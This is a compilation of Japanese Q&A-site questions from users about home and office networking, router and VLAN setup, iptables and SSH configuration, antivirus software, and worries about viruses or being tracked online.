有線・無線をひとつのホームネットワークで構成する方法 HUBを経由して、Wifi接続のデバイスから有線LAN接続されているNASやデスクトップにアクセスする方法を教えて下さい。 今まで有線・無線混在で一つのホームネットワークを組んでいましたが、 引っ越しをきっかけにデバイスも増やしHUBを買って接続しました。 すると無線接続のノートPCからNASやデスクトップの共有フォルダにアクセスできなくなりました。 恐らく利用している無線ルータは、HUBを介して有線LANで接続されたデバイスにアクセスが出来ない仕様なのかと思いますが このような構成で一つのネットワークを組むことに対応した無線ルータやHUBがあれば教えて下さい。 よろしくお願いいたします。 ・無線接続でノートPCからNASにアクセス出来ない（見えない） ・無線接続でノートPCからデスクトップの共有フォルダが見えない ・ノートPC、iphone、ipadからインターネットにはアクセスできる ・iphone,ipadからはNASにアクセスできる（BUFFALOアプリで） ・ノートPCを有線LANでHUBにつなぐとNASにアクセスできる ＊見づらいですが簡単な構成図を添付します ＊無線のSSIDは旧来、現在共に変更していません ＊なぜかiphone、ipadからはNASにアクセスできます（無線、4G回線共に） auひかり　ホーム ホームGW：　AtermBL900HW HUB：　BUFFALO　LSW4-GT-8NS 無線ルータ：　BUFFALO　WHR-HP-G NAS：　BUFFALO　LS210D デスクトップ：　Dell　inspiron530 Win7 home 64bit ノート：　Epson　NY3000　Win7 home 64bit
添付した画像のように、複数のXXX@XXX.comから迷惑メールが届いているのですが、これに対して「こちらにメールを送るのは止めてください。警察に通報しますよ。」とメールを返したところ、「Returned mail : see transcript for details」の件名、差出人「Mail Delivery Subsystem」から、 The original message was received at Wed, 29 Jan 2014 13:28:28 +0900 (JST) from XXX@xxx.ne.jp [xxx.xxx.xxx.xxx] ----- The following addresses had permanent fatal errors ----- <info@qqcz5468gsuef.com> (reason: 553 5.7.1 sorry, that domain isn't in my list of allowed rcpthosts (chkuser)) ----- Transcript of session follows ----- ... while talking to qqcz5468gsuef.com.: >>> DATA <<< 553 5.7.1 sorry, that domain isn't in my list of allowed rcpthosts (chkuser) 550 5.1.1 <info@qqcz5468gsuef.com>... User unknown <<< 503 RCPT first (#5.5.1) Reporting-MTA: dns; smtp11.dti.ne.jp Received-From-MTA: DNS; xxx.xxx@xxx.ne.jp Arrival-Date: Wed, 29 Jan 2014 13:28:28 +0900 (JST) Final-Recipient: RFC822; info@qqcz5468gsuef.com Action: failed Status: 5.1.3 Remote-MTA: DNS; qqcz5468gsuef.com Diagnostic-Code: SMTP; 553 5.7.1 sorry, that domain isn't in my list of allowed rcpthosts (chkuser) Last-Attempt-Date: Wed, 29 Jan 2014 13:28:30 +0900 (JST) Re: ?期日が迫っております?も.eml Subject: Re: ?期日が迫っております?もう待てません。 From: ***** <***@xxx.ne.jp> Date: 2014/01/29 13:28 To: info@qqcz5468gsuef.com これ以上こちらにメールを送るのは止めてください。警察に通報しますよ。 という内容のメールが届きました。これはどういう意味なのでしょうか？おそらく届いていないということは、これからも何度もメールが届くということだと思うので、メルアドを変更しなければならないかと考えていますが、何故こちらからのメールが相手に届かなかったのか、メッセージの解読出来る方、教えていただけると助かります。よろしくお願いします。
PC　－　ルータ　－　ルータ　－　PC　というネットワークがあります。 それぞれのネットワークは以下の通りです。 PC（192.168.0.0/24）　－　ルータ（LAN側：192.168.0.0/24　WAN側：10.10.10.0/24） 　－　ルータ（WAN側：10.10.10.0/24　LAN側：192.168.0.0/24）　－　PC（192.168.0.0/24） ２台のPCが同じネットワーク上にいるのですが、 こういった場合、どういう設定をルータにすればよいのでしょうか。 トンネルをはればできる、ということも小耳にはさんだのですが、 具体的にどういったトンネル、設定をすればよいのかが分かりません。 ルータはNECのIX2105を使用しているのですが Cisco、Yamaha等でも構いませんので、configを頂けると幸いです。 お分かりの方、お手数ですがご教授の程よろしくお願い致します。
ルーターを挟んでネット上のあるサーバーとhttpで通信する時 (パソコン)-(ルータ)-(ネット上のあるサーバー) パソコンのプライベートIPアドレス 192.168.100.2 ルーターのプライベートIPアドレス 192.168.100.1 ルーターのグローバルIPアドレス 124.83.235.204 ネット上のあるサーバー のグローバルIPアドレス 74.125.235.119 とします。 1 パソコンからネット上のあるサーバーへパケットを送ったとき そのパケットを受け取った ネット上のあるサーバー上では、 そのパケットのIPヘッダーの送信元IPアドレスは 192.168.100.2、192.168.100.1　ではなく 124.83.235.204 2 ネット上のあるサーバーから応答パケットがパソコンへ戻ってきたとき そのパケットを受け取った パソコン上では、そのパケットのIPヘッダーの送信元IPアドレスは 124.83.235.204、192.168.100.1 ではなく 74.125.235.119 で正しいでしょうか？
httpsでの通信は IPヘッダー、TCPヘッダー、UDPヘッダーはすべて暗号化されるでしょうか？
自宅でサーバを構築中です。 以下のサイトを参考に構築しています。 http://centossrv.com/iptables.shtml 作成したiptables.shを起動すさせようとすると、 「iptables: Memory allocation problem.」のメッセージが繰り返し表示されます。 ユーザ定義チェイン作成の部分でデバッグをすると、cidr.txtにある77のレコードを取得した後に メッセージが出力されていました。 メッセージの内容からすると、使用しているメモリに原因があるような気がするのですが、 メモリの増設で対応するのが望ましいのでしょうか。 それとも、ほかの原因があるのでしょうか。 ちなみに、使用しているサーバのメモリは2Gとなっていますが、サーバ起動中は0.5Gに満たないくらいの消費です。
大学の図書館で拾ったＳＤを何気なくＰＣに入れてしまった。 ただの旅行写真のようだが、セキュリティの上で、重大な誤りを犯したのではと心配になった。 ウイルスバスタークラウドを入れているが、何かＰＣ、またはＳＤを調査してもらわねばならないか？ 必要があるならどこに頼めばいいのか？銀行等とやり取りにつかっているＰＣなので不安です。
ネットサーフィンしていると突然アダルトサイトへ入会したことになり、数秒ごとに現れるその画面を消しても消してもそのＨＰにアクセスさせるような画面が表示されてしまいます。それを消すには入金しないとダメと書かれています。入金の意志は全くないのですが、根本から削除しないとネット利用中だけでなく文書作成時にも文字入力がストップさせられるので何とかしたいのです。やり方を教えてくださいませんか？
先日、ネットワークなどをお願いしている会社から Ahkun EX AntiMalwareを導入するよう勧められました。 メール・USB接続・ソフトインストールは行います。 サーバー：１台 クライアント：5台 現在は、ウィルスバスターのみなですが、やはり何か導入した方が宜しいでしょうか？ また、Ahkun以外であまり費用がかからずお勧めのものがありましたら教えてください。 素人なので、分かりやすくご教授頂ければ幸いです。
ハッキング（クラッキング）って何ですか？？？ PCに無知な私に教えてください。 例えばネットで通販など普通のサイトを見ていて、 次のページに行こうとしてクリックしただけでクラッキング してしまうことはあるんですか？ウイルス感染みたいな感じで・・・。 先日、閲覧していたら画面が変わり英文が表示されてしまいました。 すぐ戻ったので一瞬しか見ていませんが noticed・hacking・userという単語がありました。 素人にでもできてしまうのでしょうか？（するつもりはありません） ネットを使っていて知らない内にしてしまっていたら？と思うと 不安です。 私はエクセルで数字の合計をする時に１つずつ電卓で足していきます。 量が多いと大変なんですが・・・。 しかし先日、数字を選び合計ボタン？を押すと勝手にPCが計算してくれるのを 教えてもらい、さらに選択してクリックしたまま移動すると他のところもPCが計算して 合計してくれました。こんな便利な機能～。と思いましたが・・・。 上記程度のPCに関しては素人な私でもできたりするのでしょうか？ また、クラッキングされていた場合は分かるのですか？
こんにちは。 iptablesの学習でテスト用のFWサーバーと2台のWebサーバーをつくりました。 いまはForwardでアクセスごとに転送先を振り分ける実験をしています。 FTPのForward設定でわからないことがあるので質問させてください。 やりたいこと： ip_conntrack_ftpを組み込めばiptablesにいちいちパッシブ通信の使用ポートすべてを指定しなくても、モジュールが自動で制御してくれるという情報をネットで見かけ、それをやってみようと考えています。ところがどうがんばってもFTPのパッシブモードがつながりません。FTP以外のサービス、たとえばDNS, NTP, HTTP等のForwardは問題なく行えています。 環境： FWサーバー　→　CentOS6 iptablesで外部からのアクセスをブロックしたり、振り分けたり。 WEBサーバー　→　CentOS6 apacheとvsftpdでWebサーバーを構成。iptables無効です。 ルーター　→　業務用ですがファイアウォール等はすべて無効になっています。 111.222.333.0はグローバルIPアドレスです。 192.168.1.0はローカルIPアドレスです。 　　　　　　　　　　　　　　　　　　　　　　　　　　　　 -eth0(WEB_SERVER1) 　　　　　　　　　　　　　　　　　　　　　　　　　　　　 | 192.168.1.2(→111.222.333.2) (ONU)-(ROUTER)-eth0(FW_SERVER)eth1----| 　　　　　　　111.222.333.1(eth0)　　　　　　　　　 | 　　　　　　　111.222.333.2(eth0:1)　　　　　　　　　-eth0(WEB_SERVER2) 　　　　　　　111.222.333.3(eth0:2)　　　　　　　　　 192.168.1.3(→111.222.333.3) 　　　　　　　192.168.1.1(eth1) FWサーバーのiptable設定： net.ipv4.ip_forward = 1 ip_conntrack_ftpモジュール有効 ip_nat_ftpモジュール有効 iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP . .(一部省略) . # HTTP iptables -A FORWARD -p tcp -i eth0 -o eth1 -m multiport --dport 80,443 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT iptables -A FORWARD -p tcp -i eth1 -o eth0 -m multiport --sport 80,443 -m state --state ESTABLISHED,RELATED -j ACCEPT # FTP(ここをどうしたらいいのかわからない) iptables -A FORWARD -p tcp --dport 21 -j ACCEPT iptables -A FORWARD -p tcp --sport 21 -j ACCEPT # Webserver1 iptables -t nat -A PREROUTING -i eth0 -d 111.222.333.2 -j DNAT --to-destination 192.168.1.2 iptables -t nat -A POSTROUTING -o eth0 -s 192.168.1.2 -j SNAT --to-source 111.222.333.2 # Webserver2 iptables -t nat -A PREROUTING -i eth0 -d 111.222.333.3 -j DNAT --to-destination 192.168.1.3 iptables -t nat -A POSTROUTING -o eth0 -s 192.168.1.3 -j SNAT --to-source 111.222.333.3 上記設定でFTPのForward部分をmultiportにしてポート20を入れたり除いたり、NEWやESTABLISHEDやRELATEDを入れたり消したり、いろいろ試行錯誤していますがFilezillaで下のようなエラーがでます。 PASV レスポンス:227 Entering Passive Mode (111,222,333,2,92,226). コマンド:LIST エラー:接続タイムアウト エラー:ディレクトリ一覧表示の取り出しに失敗しました 説明が長くて恐縮ですがよろしくお願いします。 <(_ _)>
非常に面倒な質問ですが、すべてでなくてもご回答いただけると助かります。 会社の基幹ネットワークから当部署への入口にあるスイッチを交換することになりました。 現在使用している機種はPlanexのSWP-0124Gです。 どうも調子が悪いらしいのですが、予算的な理由でネットワークに詳しくない部署内の人間で交換します。 他部署の詳しい人の話では、当部署と異なるセグメントの他部署へSWP-0124Gと直接接続しているそうです。 SWP-0124Gでそのような設定をしているのではないかという話です。 質問です １）SWP-0124Gはレイヤー2スイッチですか、レイヤー3スイッチですか ２）交換する機器はレイヤー２と３、どちらが妥当かと思われますか ３）24ポートくらいで交換にお勧めな製品をご紹介いただけますか ４）当部署で私が適当に買ったレイヤー２スイッチ（SWP-0124Gの下流に位置してます）やHubは全部HP製品なのですが、HP製品で上記仕様を満たすお勧めの製品はありますか 本当は専門業者にお願いしたいのですけど、予算と、上司の「業者に頼みたくない＝自分がすべて判断・設定したことにしたい」という面子のおかげで苦労してます。 ■参考：PlanexのSWP-0412Gの商品ページ http://www.planex.co.jp/product/intelli_layer/sw …
CPUのソケットが曲がってしまったのですがどうすればいいですか？ こんなこと初めてで。 アドバイス お願いします。
無料のメーリングリストを探しています。 ある指定したメールアドレスからの受信があった場合、作成したリストのアドレスへ送信するというものです。 または、指定されたアドレスへ送信すると、作成したリストのアドレスへ送信する、というものでも良いです。 できれば広告無しが良いのですが、そんな都合の良いものってありますでしょうか。
http://oshiete.goo.ne.jp/qa/3612944.html ↑を読んだのですがよく理解できませんでした。 ファイルシステムはディレクトリを使って階層構造で管理するという認識なのですが メリット デメリット を含め、ご教授頂けないでしょうか？ 何卒よろしくお願いします。
お家でimacを使っています。 ここ数日マックのモニタの右上に変なものが出るようになりました。 添付した画像のようなものが出てきます。 ウィルスユーティリティ走らせても何も検索されません。 何なのかご存知のかた、どうしたら出なくなるかお教え下さい。
たとえば公なでのパソコンのIPを知ることが出来れば そのパソコンのネット使用記録を見ることが出来ますか？ 公のパソコンは中央サーバとつながっていると思います。 （メールや接続が出来なくなっているサイトがあります） ID,パスワード、接続記録など全部見ることが出来ますか？ 課長が数日前にいきなり自分の席にあるパソコンのIPなどを確認していったので ちょっと不安になって質問です。
モデムはFujikuraFCM-160Jを使っていますがルーターのAtermWR8165N を繋げてもACTIVE？のランプがつかずWi-Fiは出るのですが どうしても繋がりませんどうかインターネットができるよう教えてください!!
前までこんな事らなかったのに 最近 朝10時～深夜1時ぐらいまで ツイキャスやニコ生やYouTubeに100%サーバエラーになって困ってます！ ゲームは繋がります！自宅にWi-Fi環境は整ってません！ どうしてでしょうか？ 改善する方法を教えて下さい！
会社のネットワークプリンター（カラー）から出力したり、しなかったりします。 ちなみに同じネットワークにある白黒プリンターからは出力します。（まったく問題なし） 状況は以下のようなのですが、どの部分がおかしいのか可能性のあることを教えてください。 ・同じネットワーク内（完全に同じセグメントです）の白黒プリンターからは問題なく出力 ・数日前同様に出力しなくなったときはプリンターの再起動とパソコンの再起動で出力された ・数日後にまったく出力しなくなった（再起動してもだめ） ・出力しないときにpingを実行→OK ・出力しないときにブラウザでプリンターのIPを入力し、設定の確認や設定の変更もできる ・数日利用せずに久しぶりに試してみたら問題なく出力できた ・ちなみに複数台のパソコンで同様の現象 これはプリンターの調子が悪いのでしょうか？ それともほかの部分でしょうか？ サポートセンターに電話したら、ネットワークの不具合の可能性があるといわれましたが、ネットワーク管理者は出力しない時にpingやブラウザからの設定もできているので、ネットワークの不具合の可能性はないのではないかと言っています。 プリンターの調子が悪いのであれば、購入しようと思うのですが、プリンターのせいでないのであれば、買いたくありません。 何か設定で見るとよいところなどありませんか。 とりあえず怪しいところを知りたいのでお願いいたします。
macのウイルス対策としてウイルスソフトは何がいいですか？ウイルスバスターを入れていたのですが、Wikipediaなどの一部のWebページが見れず、ウイルスバスターをアンインストールしたところ、それらのWebページも見ることができました。ただ、ウイルスバスターをアンインストールしたために、ウイルスが入ってくる恐れがないとは言えないので、ウイルスバスター以外に何がいいですか？ウイルス対策ソフトによってWikipediaなどWebページが見れないのは嫌なので、いいやつを教えてください。
現在スマートフォン（Experia AX)で無料版のアバストを使っているのですが、今日、曲を聴いていたら突然、「問題が見つかりました。」という報告がありました。４つの問題があり、Experia ホーム　、rylica 、spメール LINE などにトロイの木馬android:SMSSend-DW[Trj]や不正なプログラミングなどが報告されてました。それから、アプリのスキャンをすると415個もの問題が見つかりました。それからパソコンで調べて、アンチウイルスソフトを2つ入れるのはやめたほうがいいことがわかったのですが、僕はアバストとZonerの無料版を二つ入れていました。はじめに問題が見つかったときに一応モバイルネットワークとwifiネットワークからは接続を切りました。誤検出でしょうか。それとも、ウイルスに感染しているのでしょうか。
L3スイッチとL2スイッチでリンクアグリゲーション接続をする場合、この2つのメーカーが 違う場合でも問題なくリンクアグリゲーション接続できますでしょうか？ （例えばL3SW（Catalyst3750）にL2SW(Procurve)接続などのケース）
L3スイッチでVLANを切っている際には、通常PCのデフォルトゲートウェイは L3スイッチに設定した各VLANのIPアドレスを指定するものなんでしょうか？ それともL3スイッチ上位のルータのIPアドレスを指定するものでしょうか？
今使っているスマートフォンの通信がかなり遅いので、高速通信的なのをつけたいのですができますか？
ネットにつながりません！ どうしたらいいでしょうか！ 子宮お願いします
インターネット接続の資料を無くしました。突然ネットに接続できなくなったので一からやり直す感じになったんですがネットの資料が無くなって完全に詰んでおります。パスワードは分かりますがユーザー名がわかりません。どうしたらいいでしょう？ ユーザー名だけでも知る方法は無いんでしょうか？ネットできんとマジ死にます。
Ｓｐｙｂｏｔ-Ｓ＆Ｄを使用してＡｄｗａｒｅの検索をしたのですが、他の物は削除できたのですが題目のものがどうしても削除できません。　ご教示頂けませんでしょうか？ ＯＳ：　Windows ＸＰ　Ｕｐｄａｔｅは最新 今までやったこと ファイル名を指定して実行　から　”msconfig.exe”で　”システム構成ユーティリティ”　を起動し、　怪しげな　ＱＱprotect　をスタートアップからはずし、再起動とともに　真っ先に　Ｓｐｙｂｏｔ-Ｓ＆Ｄ　を走らせたのですが、相変わらず　Ｔｅｎｃｅｎｔ．ＡｄｄｒｅｓｓＢａｒ　がリストに出てきて削除できません。 感じ的にはWindowsの再起動のとき、他の機能に先駆けて、どうも真っ先に　Ｔｅｎｃｅｎｔ．ＡｄｄｒｅｓｓＢａｒ　が立ち上がり、メモリーに常駐しているような気がします。 ＱＱの場所が分かったので、そのフォルダーのプロテクトをはずし、フォルダーごと削除しようとしましたが、「今使用中のため削除できません」　の様なメッセージが出てそれも不可能です。 どうも　百○というサーバーに関連している様です。 どなたか削除に成功された方がいらっしゃればどうぞご教示をお願いします。
教えてくれた方、気づかなくてごめんなさい 携帯が・・・ 誰かに操作されて（一応証拠は撮ってあります）いました。 はっきりいって 一年以上前には、既に。 使用できるサイトに入れなかったり パスワードが変わっていたり ヤフーアドレスは作ってすぐに 盗まれたり （試しに送信するとerrorではなく、使われていました。） これらの証拠画像のプリントアウトやディスクで 犯人特定は可能でしょうか？ 気持ち悪いです。 長文申し訳ありませんがアドバイスいただけましたら幸いです。 キャリアauなのにいつのまにかSoftBankでのシークレットモードアドレスが潜り込んでいた事もあり（シークレットを使用しないので気づけませんでした） また 一体何が目的でしょうか？ 嫌がらせにしては人と関わり無いから不思議です。重要人物でもありません(゜∇゜)
Ｊａｎｅという、２ｃｈ閲覧ソフトで会社から見ているのですが、 ２ｃｈってセキュリティ的に危なくないですか？ 会社のパソコンには、ＮｏｒｔｏｎＩｎｔｅｒｎｅｔＳｅｃｕｒｉｔｙが入っているのですが、 ２ｃｈを見てる人からＩＰ暴かれ、アタックされたりとかってこと ありうるのでしょうか？ 会社で見たらよくないでしょうか？ まあ、何を会社で見ていいか、悪いかとかとても難しい話ですが。 そのあたり詳しい方、ご指導お願いいたします。 よろしくお願いいたします。
PCがセーフモードになってしまいました。 電源を点けても画面が暗いままです。マウスを動かすとマウスポインターが現れます。 どこのキーを押せば良いのか解りません。 PCはＴＯＳＨＩＢＡのＤｙｎａｂｏｏｋのT552/58GBのWindows8.1を使用しています。 宜しく御願いします。
●質問の主旨 クライアントコンピューターとサーバー間で SSH通信を行いたいと考えています。 公開鍵暗号方式でSSHサーバーに対して、 クライアントコンピュータからリモート接続を行おうとして クライアントのTeraTermを使って秘密鍵でアクセスしようとしたところ、 「SSH2秘密鍵の読み込みに失敗しました」という添付画像のような メッセージが出ます。 このメッセージ出されることなく、クライアント～サーバー間で SSH通信を行うためには、どこをチェックすればよいでしょうか？ ご存知の方がいらっしゃいましたら、ご教示願います。 ●質問の補足 現在の状況は以下の通りです。 1．クライアントのTeraTermで秘密鍵（id_rsa)と公開鍵（id_rsa.pub)を作成 2．秘密鍵（id_rsa)はクライアントのCドライブのRSAという任意の名前のフォルダに保存 3. 公開鍵（id_rsa.pub)はSFTPでサーバーの一般ユーザのホームディレクトリに転送 4. 一般ユーザのホームディレクトリ配下に/.ssh/authorized_keysディレクトリを追加 (cat id_rsa.pub > /home/user/.ssh/authorized_keys) 5.chmodコマンドで.ssh及び.ssh/authorized_keysのアクセス権を変更 6．cat authorized_keysで中身を見ると、 公開鍵（id_rsa.pub)の文字の羅列が並んでいる ●環境 上記で言う、クライアントコンピュータはWindows8を使用しています SSHサーバーは、CentOS6.0をディストリビューションとするLinuxを使用しています
SOFTBANKの206SHを使っています。 モンハン4のオンライン用でデザリングってのをしたいのですが、どうしたらいいですか？ できたら詳しくDSの接続方法まで教えて頂けると助かります。
今イランに居ますが ネット制限が強く例えばfacebookが出来ません。至急回避したいのですが！誰か親切な方教えてください。
会社のgmailを外出先から見れるような設定に変更してもらいました。 残っている仕事があったので、ログインしていたのですが、うっかりログアウトせずにyoutubeなどネットサーフィンをしていました。 youtubeをみたときに、会社アカウントで管理されていますと表示されて慌ててログアウトしました。 別に疚しいページを見ていたわけではないのですが、なんか履歴のチェックをされるのも。。。。 もう一度ログインして履歴は削除したのと、もともと履歴は残らないような設定になっていたのですが、この場合履歴を見られてしまうのでしょうか？ ちなみに、会社のPCでログインした時は履歴チェックされています。
vmplayerにcentosをインストールし、putty(ssh)で接続しようとしているのですが、つながらない状態です。 いろいろ試したところ Comodo Firewallを無効にすれば接続できますが、トレーニングモード以上だと接続できなくなります。 またカスタムルールでputtyを許可しても同じでした。 CMDのtelnetでも22番ポートで接続しようとすると、同様の状態になったため(やはり無効にすると繋がります)firewallで22番ポートが閉じられているのかなと考えています。 Comodoの設定について、どのようにすればよいか教えていただけないでしょうか？
社内でメール文書を書くとに、頻繁にグルーグルなどで丁寧語、尊敬語などを見て参考にしています。 勤務中は他のサイトなどを見ないように言われています。 社内ではプロキーサーバー経由でインターネットに接続しています。 なので、市販のWi-Fiルータを購入を考えています。 市販のWi-Fiルータを使用すれば、第三者が誰がどのサイトを閲覧したかは解らないのでしょうか?
OAuthのライブラリでjavaのものを探しています。お勧めのものがあればどなたか教えてください。 よろしくお願いいたします。
新大学生です。 ネットで調べてると「ＷｉＭＡＸとｅモバイル」は外出用で、家に居るとき電波がほぼ繋がらないと聞きました。使い物にならないと。 僕のマンションは一応、電波対応地域（神戸）ですが鉄筋コンクリートで出来てますので速度等に期待できそうにありません。マンション自体はフレッツ光に加入してるそうです。 家の中での「ＷｉＭＡＸとｅモバイル」によるＷｉ－Ｆｉ使用が難しいようであれば、もちろん２つとも諦めようかと思います。。。 ですが自分は、自宅でも外出先でもＷｉ－Ｆｉをどうしても使いたいです。 おまけに動画もよく見る方です。 僕の頭の中には、ＷｉＭＡＸとｅモバイルしか知らなかったので、これ以上何があるか分かりません。 そもそも僕みたいな条件の一人暮らしをしてる人って、どこの商品を使ってるのでしょうか？ とにかく、どなたかお勧めの商品ご存じでしたら、ぜひアドバイス下さい。 宜しくお願いします＼(__ )
エフセキュアを使っていたのですが、期限が切れます。どのソフトが良いと思いますか？ PFWがOSのを使うように変わってしまったそうなのでアウトバンド通信を考えると変えるしかないのかなと思っています。 １スーパーセキュリティ ZERO ２マカフィー ３ESET から選ぼうと思っているのですが、http://thehikaku.net/security/zero/super.htmlこちらを見ると１は不安定と聞きます。安さ、検出率多機能性は良いようですが、不安定なのでしょうか？ ２は無難ですよね。何台まで使えるか知りませんが、 ３．は多機能性以外は非常に良いと思います。WEBページのブラックリストチェックがあればこちらにしたのですが、フリーのソフトなどで代用できないのでしょうか？
先日、よく遊びに来る友人が私の家に来た際に これを使ってイイよ！と言われ 置いていったものが Aterm WR8165N のルーター？というもので、 Wi-Fiがつながるものでした これが現在家にあるので携帯からのネットもさくさく繋がりますが、持ち主である友人には 私がWi-Fiに繋げている間の閲覧履歴は見られるのでしょうか？ だとしたら、どのようにすれば閲覧できないようにできますか？(>_<) 教えて下さい！
ショッピングサイトを製作中なのですが、ひとつのIDに対して、特定の端末のみからログインさせる必要があります（IDとパスワードさえわかれば、どの端末からでもログインできるようにさせたくない）。 これを実現するのになにかよい方法はありますでしょうか？ 電子証明書で実現できるのではないかと思っているのですが、具体的にどうしてよいかわからず困っています。また費用はどの程度かかりますでしょうか？会員数に比例して費用が発生するのでしょうか？また、導入の手間はどの程度ですか？会員側でも手間を必要とするでしょうか？ あるいはまた、もし電子証明書以外の方法があれば、是非ともご教授願いたいです。
中国百度のバイドゥIMEが入力情報を送信していた問題はGoogleの日本語入力IMEも同じでは？ なぜGoogleは叩かれないんでしょう？
VLANを勉強中です。技術的な点でお尋ねします。 デフォルトゲートウェイにVLAN対応のルーターを設置。 １～3階各フロアにタグVLAN対応L2スイッチを設置しているとします。 VIDは三つ作りますが、そのメンバーは階ごとではなく、どの階にも存在するとします。 （VID1、VID2、VID3に属するPCがどの階にも存在する。） この状況下で、各階の間（１階から２階、２階から３階）の幹線上にVLANに対応しないハブが存在するとします。 この場合、 　・一つでも存在すると、VLANが機能しない？ 　・問題なくつながる？ 　・条件次第（その条件は？） どのようになるのでしょうか？ よろしくお願いします。 　
ゲストがインターネットを利用できるよう、ただし社内ネットにはアクセスできないようにしたいと考えています。 いずれは、出向者がインターネットとネットワークプリンタのみを使えるようにしたり、部署ごとにセグメントを分ける事も視野に入れています。 無線LANアクセスポイントはBUFFALOの「WAPM-APG300N」を使用しています。 ルーターはヤマハRT57i ですが、RTX810等に置き換えを予定しています。 クライアントPCは有線・無線LAN混在で、１０台程度あります。 サーバーはWinｄows SBS2011Stdでドメイン環境にしてあります。 RTX810にはLANポート分割機能があるようですが、来客者も使う無線LANはネットワークの末端にあり、物理的にポートを分け、新たなケーブルを引き回す事が難しい状況です。広い工場内の為、ハブを複数経由しており、物理的な距離も長い状況です。 そこで、WAPM-APG300NはタグVLANを構築可能となっていたので、この機種の機能が使えないだろうかと考えました。無線LAN一台で、社員と来客者が別々のSSIDとVLANIDを使用できるようです。 ただし、条件として「VLAN対応L2スイッチ」が必要とありました。 お聞きしたいのは、ルーターから無線LANまでの間にあるすべてのハブがVLAN対応L2スイッチングハブでなければならないのか？という点です。 ルーター自体はVLANに対応しているので、社内ネットにはアクセスせず、インターネットにつなげるだけならば、可能でしょうか？ それとも、ルーターと無線LANの間にる複数のハブすべてを置き換えないと実現は難しいでしょうか。 よろしくお願いします。
http://www.atmarkit.co.jp/flinux/rensai/linuxtip …を参考にしてPuttyにて問題なくSSH鍵交換方式の認証で接続をしています。 今回、新しいPCを購入して、そこからも同じように鍵交換方式の認証を試みようと思います。 この場合、新しいPCに現在使っている秘密鍵をそのままぶち込んで使えるものなのでしょうか？ 現在使っている秘密鍵には MAC:A1B3DSt.CD... のような記述があるので、これはMACアドレスかなぁと思って、もしかして違うクライアントマシンからでは認証されないのかなと思いました。この辺お分かりでしたら教えてください。宜しくご教授お願い致します。
■環境 ・フレッツ光 ・光電話なし ・バッファロー有線ルータ利用(PC2台) ■前提 ・不定期でネットへ繋がらなくなる。その際、ルータ管理画面「192.168.11.1 」へもアクセスできなくなる ・ルータ再起動するとネットへ繋がり「192.168.11.1 」へもアクセスできるようになる ・ローカルエリア接続「tcp/ipv4」「tcp/ipv6」プロパティは「IPアドレス自動取得」、その下DNSも自動取得 ■質問 ・ネットへ繋がらなくなった際、「192.168.11.1 」へもアクセス出来なくなる理由が分かりません ・ルータ再起動するとネットへ繋がるようになることから、ケーブル不具合ではないと思います ・「192.168.11.1」は、ローカルエリア(？)なので、ネット接続とは関係なしにいつでも繋がるものだと認識していたのですが… ・これはルータが死んでしまった、ということを意味するのでしょうか？ ・「192.168.11.1 」のアクセス先はルータ内部(?)なので、一時的にルータが死んでしまったら、アクセス出来なくなる、ということなのでしょうか？ ・ルータ管理画面へ突然アクセス出来なくなる理由としては、一般的にどんなものが挙げられるでしょうか？
■環境 ・フレッツ光 ・光電話なし ・有線ルータ利用(PC2台) ・Windows7 ・WindowsXP ■質問1 ・各PCにローカルエリア接続はそれぞれ必要なのでしょうか？ 選択肢A.必ず必要(PC2台あったらそれぞれのPCにローカルエリア接続を要設定) 選択肢B.メインのPCにだけあれば良い(他のPCはLANポートにケーブルを挿すだけ) ■質問2(選択肢2の場合) ・各PCにローカルエリア接続が存在しても良い？ 選択肢A.全部のPCに存在しても良い(不要なローカルエリア接続は使わないだけだから) 選択肢B.メインPCにだけ設定(他のPCにローカルエリア接続があると干渉する場合があるので削除した方が良い) ■質問3 ・「ローカルエリア接続」の役割は？ ・実際のネット接続設定は「ルータ管理画面」を通して、ルータ内部(?)へ設定すると思うのですが、「ローカルエリア接続」は何をしているのでしょうか？　何のために必要なのでしょうか？
YAHOO知恵袋に左翼バカがいて http://chiebukuro.yahoo.co.jp/my/myspace_quedeta … バカな質問ばかりしています。 しかしLANのカテゴリマスタになっていて、想像するに嘘で適当な答えをして 質問者を騙すか仲間がベストアンサーを選んでいると思います。 これを証明してYAHOOに通報してBANしてもらうつもりですが、ネットワークのことが 私はわかりません。 コイツのBAをとった回答をいくつかリンクにだすので、これがインチキだと証明してください。 http://detail.chiebukuro.yahoo.co.jp/qa/question … http://detail.chiebukuro.yahoo.co.jp/qa/question … http://detail.chiebukuro.yahoo.co.jp/qa/question … どう見ても自分が知っている言葉を並べただけでそれっぽく見せているだけと思います。 コイツのプロフィール見てもわかりますが、単なるバカです。 お手数かけますが、どなたかお願いします。 その他の質問に関しても、検証していただければと思います。 追い詰めなくてはいけないんです！
自宅でサーバーを運用しております。 ルータの仕様により、ローカル内でローカルアドレスでアクセスすることは可能ですが、 ローカル内からグローバルアドレスでのアクセスができません。 (ローカル外からのグローバルアドレスでのアクセスは可能) これについては納得しているのですが、 この仕様の名称を教えてください。
こんにちは。 今日、パスワードに関する記事を読みました。 パスワードというのは平文で保存しないで、代わりにハッシュ関数を施した値を保存して、これらの値が漏えいしても元のパスワードが解読されないようにしているみたいです。そして「ストレッチング」というのは、このハッシュ計算を何回も施した値を保存するのだそうです。 そこで、質問です: パスワードの保護に関して「十分に安全なハッシュ計算」（そういうモノがあるとして）の冪乗は、再び「十分に安全なハッシュ計算」になるのでしょうか。 よろしくお願いします。
昨日、友達から、「最近ネット見ただけで住所特定されたりするんだってよ、お前も気をつけろよ」って言われました。サイトにアクセスしただけで住所が読み取られることってあるんですか？教えてください。
僕は、自分のiPodtouchを持っているのですが、そのiPodがウイルスに感染すると、同じ無線LANルーターで繋がれているパソコンはウイルスに感染してしまうのでしょうか？
先月、友人に自分のiPodtouchを貸したのですが、友人がアダルトサイトを閲覧していたことが分かり、その日から家にある無線LAN(NTTからレンタルしてたような...)のランプ(何のランプか分からないのですが)がずっと点滅しています。ウイルスではないかと心配になってインターネットで調べると、ウイルスが外部のネット機器を感染させようとしてネットを使っている可能性があると書いてありました。僕の家の無線LANルーターはウイルスに感染しているのでしょうか？また、同じ無線LANルーターに違うネット機器をつなぐと、そのネット機器にもウイルスが感染してしまうのでしょうか？ネットには詳しくなくてわかりません。教えてください。
